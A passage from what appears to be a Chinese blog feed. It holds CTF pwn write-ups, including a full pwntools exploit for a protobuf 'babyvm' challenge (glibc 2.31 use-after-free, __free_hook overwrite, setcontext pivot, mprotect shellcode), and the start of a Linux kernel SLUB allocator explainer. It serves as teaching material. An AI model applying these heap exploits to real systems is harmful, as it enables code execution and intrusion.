class="hljs-number">14</span>)<br>delete(<span class="hljs-number">12</span>)<br>delete(<span class="hljs-number">13</span>)<br>add(<span class="hljs-number">15</span>, <span class="hljs-string">&#x27;aaa&#x27;</span>, p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span> + p64(<span class="hljs-number">0x301</span>) + p64(free_hook))<br>add(<span class="hljs-number">3</span>, <span class="hljs-string">&#x27;c&#x27;</span>, <span class="hljs-string">&#x27;d&#x27;</span>)<br>add(<span class="hljs-number">4</span>, <span class="hljs-string">&#x27;c&#x27;</span>, p64(system))<br>add(<span class="hljs-number">12</span>, <span class="hljs-string">&#x27;c&#x27;</span>, <span class="hljs-string">&#x27;/bin/sh\x00&#x27;</span>)<br>delete(<span class="hljs-number">12</span>)<br>io.interactive()<br><br></code></pre></td></tr></table></figure><h2 id="babyvm"><a href="#babyvm" class="headerlink" title="babyvm"></a>babyvm</h2><p>题目涉及到protobuf的基础知识</p><p>这个说起来也简单，就是类似一种高效版的xml文件，可以将我们的对象进行一个序列化，也就是转成一种串行的字节序列来进行传输，题目逆一下可以发现如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> __fastcall __noreturn <span class="hljs-title function_">main</span><span class="hljs-params">(__int64 a1, <span class="hljs-type">char</span> **a2, <span class="hljs-type">char</span> **a3)</span><br>&#123;<br>  __int64 protobuf_size; <span class="hljs-comment">// rsi</span><br>  __int64 protobuf_structure; <span class="hljs-comment">// [rsp+8h] [rbp-8h]</span><br><br>  sub_178D();<br>  <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )<br>  &#123;<br>    <span class="hljs-built_in">memset</span>(cmd, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(cmd));<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;&gt;&quot;</span>);<br>    protobuf_size = read(<span class="hljs-number">0</span>, cmd, <span class="hljs-number">0x400</span>uLL);<br>    protobuf_structure = (__int64)decompile(<span class="hljs-number">0LL</span>, protobuf_size, cmd);<br>    <span class="hljs-keyword">if</span> ( !protobuf_structure )<br>      <span class="hljs-keyword">break</span>;<br>    sub_157D(<br>      *(_QWORD *)(protobuf_structure + <span class="hljs-number">0x18</span>),<br>      *(_QWORD *)(protobuf_structure + <span class="hljs-number">0x20</span>),<br>      *(_QWORD *)(protobuf_structure + <span class="hljs-number">0x28</span>),<br>      *(_QWORD *)(protobuf_structure + <span class="hljs-number">0x30</span>),<br>      *(<span class="hljs-type">const</span> <span class="hljs-type">void</span> **)(protobuf_structure + <span class="hljs-number">56</span>));<br>  &#125;<br>  error(<span class="hljs-number">0LL</span>, protobuf_size);<br></code></pre></td></tr></table></figure><p>这里的main函数就是不断的输出“&gt;”然后我们发送cmd指令，但这里cmd可不是瞎发啊，这里是采用protobuf协议以一种字符串序列来进行传输命令，</p><p>然后就是下面的decompile函数</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-built_in">char</span> *__fastcall sub<span class="hljs-constructor">_19F7(<span class="hljs-params">void</span> <span class="hljs-operator">**</span><span class="hljs-params">a1</span>, <span class="hljs-params">unsigned</span> <span class="hljs-params">__int64</span> <span class="hljs-params">a2</span>, <span class="hljs-params">unsigned</span> <span class="hljs-params">__int8</span> <span class="hljs-operator">*</span><span class="hljs-params">a3</span>)</span><br>&#123;<br>  return sub<span class="hljs-constructor">_5180((<span class="hljs-params">__int64</span>)</span>&amp;unk_AC80, a1, a2, a3);<br>&#125;<br></code></pre></td></tr></table></figure><p>可以发现他是调用另一个函数，到这里我就不准备再点进去看了，因为最近看内核源码看到太多这样的结构，所以我断定他是一个原生态实现的函数，所以不准备点进去逆，由于上下文的环境，大致可以猜测这个函数就是咱们的解码函数，也就是将咱们的序列化串来解析一下</p><p>下面就是咱们的主体函数</p><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs sqf"><span class="hljs-variable">__int64</span> <span class="hljs-variable">__fastcall</span> sub_157D(<span class="hljs-variable">__int64</span> choice, unsigned <span class="hljs-variable">__int64</span> idx, <span class="hljs-variable">__int64</span> size_0, <span class="hljs-variable">__int64</span> a4, const void *a5)<br>&#123;<br>  <span class="hljs-variable">__int64</span> result; <span class="hljs-comment">// rax</span><br>  size_t size_1; <span class="hljs-comment">// [rsp+18h] [rbp-18h]</span><br><br>  size_1 = size_0;<br>  <span class="hljs-keyword">if</span> ( idx &gt;= <span class="hljs-number">0</span>x21 )<br>    error(choice, idx);<br>  <span class="hljs-keyword">if</span> ( (unsigned <span class="hljs-variable">__int64</span>)a4 &gt;= <span class="hljs-number">0</span>x101 )<br>    error(choice, idx);<br>  <span class="hljs-keyword">if</span> ( (unsigned <span class="hljs-variable">__int64</span>)size_0 &gt;= <span class="hljs-number">0</span>x101 )<br>    error(choice, idx);<br>  <span class="hljs-keyword">if</span> ( size_0 &lt; a4 )<br>    size_1 = a4;<br>  <span class="hljs-keyword">switch</span> ( choice )<br>  &#123;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>LL:<br>      result = (<span class="hljs-variable">__int64</span>)add(idx, size_1, a4, a5);<br>      <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">2</span>LL:<br>      result = (<span class="hljs-variable">__int64</span>)edit(idx, a4, a5);<br>      <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">3</span>LL:<br>      result = show(idx);<br>      <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">4</span>LL:<br>      result = (<span class="hljs-variable">__int64</span>)delete(idx);<br>      <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">5</span>LL:<br>      <span class="hljs-keyword">exit</span>(<span class="hljs-number">1</span>);<br>    <span class="hljs-keyword">default</span>:<br>      error(choice, idx);<br>  &#125;<br>  return result;<br>&#125;<br></code></pre></td></tr></table></figure><p>很明显的一个菜单题,其中我们的漏洞点就是位于delete函数中的悬垂指针</p><p>本题主要是考了一个protobuf的用法，以及再ida中寻找相应消息类型的方法，只需要将消息传递搞懂其他就迎刃而解了，因为这个就是一个很简单的2.31UAF，所以本题利用步骤如下：</p><ol><li>泄露libcbase，heapbase（没什么用）</li><li>修改free_hook为一段我们的利用链，其中利用setcontext进行栈迁移到free_hook上，然后调用mprotect提升内存段权限调用shellcode即可</li></ol><p>整体exp如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> * <br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span>* <br><span class="hljs-keyword">from</span> struct <span class="hljs-keyword">import</span> pack<br><span class="hljs-keyword">from</span> ctypes <span class="hljs-keyword">import</span> *<br><br><span class="hljs-keyword">import</span> sys<br>sys.path.append(<span class="hljs-string">&#x27;./output_dir&#x27;</span>)<br><span class="hljs-keyword">import</span> devicemsg_pb2<br><br>context(arch = <span class="hljs-string">&#x27;amd64&#x27;</span>, os = <span class="hljs-string">&#x27;linux&#x27;</span>, log_level = <span class="hljs-string">&#x27;debug&#x27;</span>) <br>context.terminal = [<span class="hljs-string">&#x27;tmux&#x27;</span>,<span class="hljs-string">&#x27;splitw&#x27;</span>,<span class="hljs-string">&#x27;-h&#x27;</span>]<br>io = process(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br><span class="hljs-comment">#io = remote(&#x27;59.110.164.72&#x27;, 10066) </span><br><span class="hljs-comment">#io = remote(&quot;node4.buuoj.cn&quot;, 26610)</span><br><br>s   = <span class="hljs-keyword">lambda</span> content : io.send(content)<br>sl  = <span class="hljs-keyword">lambda</span> content : io.sendline(content)<br>sa  = <span class="hljs-keyword">lambda</span> content,send : io.sendafter(content, send)<br>sla = <span class="hljs-keyword">lambda</span> content,send : io.sendlineafter(content, send)<br>rc  = <span class="hljs-keyword">lambda</span> number : io.recv(number)<br>ru  = <span class="hljs-keyword">lambda</span> content : io.recvuntil(content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">slog</span>(<span class="hljs-params">name, address</span>): <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\033[40;31m[+]\033[40;35m&quot;</span>+ name + <span class="hljs-string">&quot;==&gt;&quot;</span> + <span class="hljs-built_in">hex</span>(address) + <span class="hljs-string">&quot;\033[0m&quot;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>(): gdb.attach(io)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_address</span>(): <span class="hljs-keyword">return</span> u64(ru(<span class="hljs-string">b&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">idx, size, content</span>):    <span class="hljs-comment">#0x2d</span><br>    msg = devicemsg_pb2.bufmsg()<br>    msg.code = <span class="hljs-number">1</span><br>    msg.tarnum = idx<br>    msg.tarbody = size<br>    msg.tarbyte = content<br>    compiled_msg = msg.SerializeToString()<br><br>    sa(<span class="hljs-string">b&#x27;&gt;\n&#x27;</span>, compiled_msg)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">idx, content</span>):<br>    msg = devicemsg_pb2.bufmsg()<br>    msg.code = <span class="hljs-number">2</span><br>    msg.tarnum = idx<br>    msg.tarbody = <span class="hljs-built_in">len</span>(content)<br>    msg.tarbyte = content<br>    compiled_msg = msg.SerializeToString()<br>    sa(<span class="hljs-string">b&#x27;&gt;\n&#x27;</span>, compiled_msg)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">idx</span>):<br>    msg = devicemsg_pb2.bufmsg()<br>    msg.code = <span class="hljs-number">4</span><br>    msg.tarnum = idx<br>    msg.tarbody = <span class="hljs-number">1</span><br>    msg.tarbyte = <span class="hljs-string">b&#x27;\x00&#x27;</span><br>    compiled_msg = msg.SerializeToString()<br>    sa(<span class="hljs-string">b&#x27;&gt;\n&#x27;</span>, compiled_msg)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">idx</span>):<br>    msg = devicemsg_pb2.bufmsg()<br>    msg.code = <span class="hljs-number">3</span><br>    msg.tarnum = idx<br>    msg.tarbody = <span class="hljs-number">1</span><br>    msg.tarbyte = <span class="hljs-string">b&#x27;\x00&#x27;</span><br>    compiled_msg = msg.SerializeToString()<br>    sa(<span class="hljs-string">b&#x27;&gt;\n&#x27;</span>, compiled_msg)<br><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">9</span>):<br>    add(i, <span class="hljs-number">0x100</span>, <span class="hljs-string">b&#x27;aaaaa&#x27;</span>)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">9</span>):<br>    delete(i)<br><br>libc = ELF(<span class="hljs-string">&quot;../tools/glibc-all-in-one/libs/2.31-0ubuntu9_amd64/libc-2.31.so&quot;</span>)<br>show(<span class="hljs-number">8</span>)<br>libc_base = get_address() - <span class="hljs-number">0x1ebb00</span><br>slog(<span class="hljs-string">&quot;libc_base&quot;</span>, libc_base)<br><br><span class="hljs-comment">#mov rdx, qword ptr [rdi + 0x8]; mov qword ptr [rsp], rax; call [rdx + 0x20]</span><br>strange_gadgets = libc_base + <span class="hljs-number">0x1547a0</span><br>pop_rdi = libc_base + <span class="hljs-number">0x26b72</span><br>ret = libc_base + <span class="hljs-number">0x25679</span><br>pop_rsi = libc_base + <span class="hljs-number">0x27529</span><br>pop_rdx_rbx = libc_base + <span class="hljs-number">0x11c1e1</span><br><br>setcontext = libc_base + libc.sym[<span class="hljs-string">&#x27;setcontext&#x27;</span>]<br>free_hook = libc_base + libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]<br>mprotect = libc_base + libc.sym[<span class="hljs-string">&#x27;mprotect&#x27;</span>]<br>slog(<span class="hljs-string">&quot;setcontext&quot;</span>, setcontext)<br>slog(<span class="hljs-string">&quot;free_hook&quot;</span>, free_hook)<br>show(<span class="hljs-number">7</span>)<br><br>heap_base = u64(rc(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)) - <span class="hljs-number">0x810</span> - <span class="hljs-number">0x280</span><br>slog(<span class="hljs-string">&quot;heap_base&quot;</span>, heap_base)<br><br>edit(<span class="hljs-number">7</span>, p64(free_hook))<br>add(<span class="hljs-number">9</span>, <span class="hljs-number">0x100</span>, <span class="hljs-string">b&#x27;ccccc&#x27;</span>)<br><br>edit(<span class="hljs-number">1</span>, <span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>)<br><br>payload = p64(strange_gadgets) + p64(free_hook) + p64(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span> + p64(setcontext + <span class="hljs-number">61</span>)<br>payload += p64(pop_rdi) + p64(free_hook&amp;(~<span class="hljs-number">0xfff</span>)) + p64(pop_rsi) + p64(<span class="hljs-number">0x1000</span>) + p64(pop_rdx_rbx) + p64(<span class="hljs-number">7</span>)*<span class="hljs-number">2</span> + p64(mprotect) <br>payload += p64(free_hook + <span class="hljs-number">0xb0</span>)<br>payload = (payload).ljust(<span class="hljs-number">0xa0</span>, <span class="hljs-string">b&#x27;\x0a&#x27;</span>) + p64(free_hook + <span class="hljs-number">0x28</span>) + p64(ret) + asm(shellcraft.cat(<span class="hljs-string">&#x27;./flag&#x27;</span>))<br><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">len</span>(payload))<br>add(<span class="hljs-number">10</span>, <span class="hljs-number">0x100</span>, payload)<br>debug()<br>delete(<span class="hljs-number">10</span>)<br>io.interactive()<br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>CTFwp</category>
      
    </categories>
    
    
    <tags>
      
      <tag>PWN</tag>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Linux_Kernel_SLUB分配器</title>
    <link href="/2023/07/18/Linux-Kernel-SLUB%E5%88%86%E9%85%8D%E5%99%A8/"/>
    <url>/2023/07/18/Linux-Kernel-SLUB%E5%88%86%E9%85%8D%E5%99%A8/</url>
    
    <content type="html"><![CDATA[<h1 id="SLUB算法"><a href="#SLUB算法" class="headerlink" title="SLUB算法"></a>SLUB算法</h1><p>之前我们讲解了伙伴系统，他的层次在于分配以page为单位的页面，但在平时我们程序使用的这么大个单位的页面机会很少，我们更倾向于分配小块例如<code>0x2e0</code>的块,而此时如果再次调用伙伴系统的分配就有点杀鸡用牛刀的感觉，所以此时Linux内核引入小块的分配器，也就是</p><p><code>slab allocator</code></p><p>他存在着三种实现形式：<code>slab</code>,<code>slob</code>,<code>slub</code></p><ul><li><p><code>slab</code>是较为古早的分配算法，其中涉及到堆块着色的问题，效率不高且较为复杂</p></li><li><p><code>slob</code>一般用于嵌入式场景，较为轻便</p></li><li><p><code>slub</code>目前较为主流的分配算法，因此本文主要是探究他</p></li></ul><h2 id="1-数据结构们"><a href="#1-数据结构们" class="headerlink" title="1. 数据结构们"></a>1. 数据结构们</h2><h3 id="struct-slab"><a href="#struct-slab" class="headerlink" title="struct slab"></a>struct slab</h3><p>首先就是我们比较主要的数据结构<code>slab</code>，他曾经是被嵌入在<code>page</code>当中，但是目前最新内核版本6.4，他被作为一个独立的数据结构进行表示，当然实际上也是复用了page的结构体，具体如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* Reuses the bits in struct page */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">slab</span> &#123;</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> __page_flags;<br><br><span class="hljs-meta">#<span class="hljs-keyword">if</span> defined(CONFIG_SLAB)</span><br>...<br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">    this zone is been used by slab allocator which use the slab approach</span><br><span class="hljs-comment">    */</span><br>...<br><span class="hljs-meta">#<span class="hljs-keyword">elif</span> defined(CONFIG_SLUB)</span><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">kmem_cache</span> *<span class="hljs-title">slab_cache</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">union</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">union</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">list_head</span> <span class="hljs-title">slab_list</span>;</span> <span class="hljs-comment">//slab头</span><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_SLUB_CPU_PARTIAL</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">slab</span> *<span class="hljs-title">next</span>;</span> <span class="hljs-comment">//slab链表</span><br><span class="hljs-type">int</span> slabs;<span class="hljs-comment">/* Nr of slabs left */</span><br>&#125;;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>&#125;;<br><span class="hljs-comment">/* Double-word boundary */</span><br><span class="hljs-type">void</span> *freelist;<span class="hljs-comment">/* first free object */</span><br><span class="hljs-class"><span class="hljs-keyword">union</span> &#123;</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> counters;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br><span class="hljs-type">unsigned</span> inuse:<span class="hljs-number">16</span>;<br><span class="hljs-type">unsigned</span> objects:<span class="hljs-number">15</span>;<br><span class="hljs-type">unsigned</span> frozen:<span class="hljs-number">1</span>;<br>&#125;;<br>&#125;;<br>&#125;;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">rcu_head</span> <span class="hljs-title">rcu_head</span>;</span><br>&#125;;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> __unused;<br><br><span class="hljs-meta">#<span class="hljs-keyword">else</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">error</span> <span class="hljs-string">&quot;Unexpected slab allocator configured&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br><span class="hljs-type">atomic_t</span> __page_refcount;<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_MEMCG</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> memcg_data;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>&#125;;<br></code></pre></td></tr></table></figure><p>上面我们已经知道slab就是复用的page结构体，我们的page结构体是用来表示物理内存中的一个内存页，我们可以通过一个page结构体找到物理内存页的页框号，同样的，当我们用slab来复用page结构体的时候，我们也可以通过他来得到物理内存页的页框号，下面是其中的一些字段解释：</p><ol><li><code>__page_flags</code>字段:他用来标识页面的相关信息</li><li><code>slab_cache</code>字段:他是一个<code>kmem_cache</code>类型的指针,该结构体我们下面讲解</li><li><code>free_list</code>:该字段指向第一个空闲的object,耗尽时为NULL</li><li><code>slab_list</code>:连接多个slab的双向链表</li><li><code>inuse</code>:已经被使用的object数</li><li><code>objects</code>:总共的object数</li><li><code>frozen</code>:标志是否（1&#x2F;0）被冻结，也就是是否被cpu.slab绑定</li></ol><p>下面的这张图就是关于目前的slab结构体的相关结构，我们慢慢来充实该图</p><p><img src="http://imgsrc.baidu.com/forum/pic/item/2fdda3cc7cd98d107f438efe643fb80e7aec906e.jpg"></p><p>其中freelist字段指向的块就是我们先前page页所代表的页框中的某块。</p><h3 id="struct-kmem-cache"><a href="#struct-kmem-cache" class="headerlink" title="struct kmem_cache"></a>struct kmem_cache</h3><p>要管理小块的分配，单单一个复用page结构的slab还不够，所以这里引入我们的管理者<code>kmem_cache</code>，如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Slab cache management.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">kmem_cache</span> &#123;</span><br><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> CONFIG_SLUB_TINY</span><br>    <span class="hljs-comment">/* 每个CPU所拥有的缓存slabs */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">kmem_cache_cpu</span> __<span class="hljs-title">percpu</span> *<span class="hljs-title">cpu_slab</span>;</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><span class="hljs-comment">/* Used for retrieving partial slabs, etc. */</span><br><span class="hljs-type">slab_flags_t</span> flags;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> min_partial;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> size;<span class="hljs-comment">/* 一个包含元数据object的大小 */</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> object_size;<span class="hljs-comment">/* 不包含元数据object的大小 */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">reciprocal_value</span> <span class="hljs-title">reciprocal_size</span>;</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> offset;<span class="hljs-comment">/* slab上空闲指针在object上的偏移 */</span><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_SLUB_CPU_PARTIAL</span><br><span class="hljs-comment">/* 需要保留的per cpu partial objects的数目 */</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> cpu_partial;<br><span class="hljs-comment">/* 需要保留的per cpu partial slabs的数目 */</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> cpu_partial_slabs;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">kmem_cache_order_objects</span> <span class="hljs-title">oo</span>;</span><br><br><span class="hljs-comment">/* Allocation and freeing of slabs */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">kmem_cache_order_objects</span> <span class="hljs-title">min</span>;</span><br><span class="hljs-type">gfp_t</span> allocflags;<span class="hljs-comment">/* 每次分配时的gfp */</span><br><span class="hljs-type">int</span> refcount;<span class="hljs-comment">/* 用于销毁slab_cache的引用计数器 */</span><br><span class="hljs-type">void</span> (*ctor)(<span class="hljs-type">void</span> *);<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> inuse;<span class="hljs-comment">/* 元数据的偏移 */</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> align;<span class="hljs-comment">/* 对齐 */</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> red_left_pad;<span class="hljs-comment">/* Left redzone padding size */</span><br><span class="hljs-type">const</span> <span class="hljs-type">char</span> *name;<span class="hljs-comment">/* 仅用作 */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">list_head</span> <span class="hljs-title">list</span>;</span><span class="hljs-comment">/* slab caches列表 */</span><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_SYSFS</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> 